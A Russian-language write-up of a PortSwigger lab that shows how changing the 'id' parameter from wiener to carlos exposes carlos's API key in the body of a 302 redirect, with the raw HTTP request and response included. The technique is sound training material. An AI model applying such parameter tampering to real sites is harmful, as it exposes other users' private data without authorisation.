---
title: "User ID controlled by request parameter with data leakage in redirect"
date: 2025-07-17
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect"
classes: wide
---

Для прохождения лабы нужно получить `API` ключь пользователя `carlos`. Даны креды `wiener`:`peter`.

```
https://0aae00b404d33de580dfd04300790011.web-security-academy.net/
```

## Solution

Войду в ЛК. 

У меня вот такой `URL`: `https://0aae00b404d33de580dfd04300790011.web-security-academy.net/my-account?id=wiener`.

Сразу поробую подставить `carlos` вместо `wiener`. Получил странный результат. Меня перекинуло на страницу `/login`. Посмотрю на это в `Burp`:

```http
GET /my-account?id=carlos HTTP/2
Host: 0aae00b404d33de580dfd04300790011.web-security-academy.net
Cookie: session=q5PH1quh4vnGihutrb5yzLpj33HLy6e3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
```

Ответ выглядит следующим образом:

```http
HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3655

...
```

После чего перенаправляет на `/login`. Если открыть `HTML`, то в нем можно найти следующее:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter_with_data_leakage_in_redirect/1.png){: height="200" .align-center}

Видимо веб-сервер отдает нам страницу, а затем перенаправляет. Попробую сдать данный `API`-ключ: 

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_User_ID_controlled_by_request_parameter_with_data_leakage_in_redirect/2.png){: height="200" .align-center}

Да, это был он)